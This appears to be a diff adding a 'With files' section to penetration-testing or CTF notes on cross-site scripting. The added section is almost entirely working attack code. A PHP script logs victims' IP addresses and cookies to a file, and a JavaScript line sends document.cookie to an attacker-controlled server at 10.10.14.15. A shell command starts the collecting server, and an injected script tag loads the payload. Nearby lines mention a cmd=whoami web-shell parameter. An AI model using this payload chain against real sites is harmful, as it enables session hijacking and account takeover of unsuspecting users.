@@ -63,6 +63,44 @@ This fetches the page that onyl the admin has access to, converts it to text, ur
 	then we pass the cmd arg in the request:
 	<url>?cmd=whoami
 
+
+## With files
+
+Create a index.php with:
+
+```php
+<?php
+if (isset($_GET['c'])) {
+    $list = explode(";", $_GET['c']);
+    foreach ($list as $key => $value) {
+        $cookie = urldecode($value);
+        $file = fopen("cookies.txt", "a+");
+        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
+        fclose($file);
+    }
+}
+?>
+```
+
+Create a script.js with:
+
+```javascript
+new Image().src='http://10.10.14.15:9200/index.php?c='+document.cookie
+```
+
+Start a php webserver:
+
+```shell
+sudo php -S 0.0.0.0:9200
+```
+
+Finally inject the XSS:
+
+```html
+"><script src=http://10.10.14.15:9200/script.js></script>
+```
+
+
 ## Tips
 
 If the username might be seen by an admin account, try to register a username as a xss payload
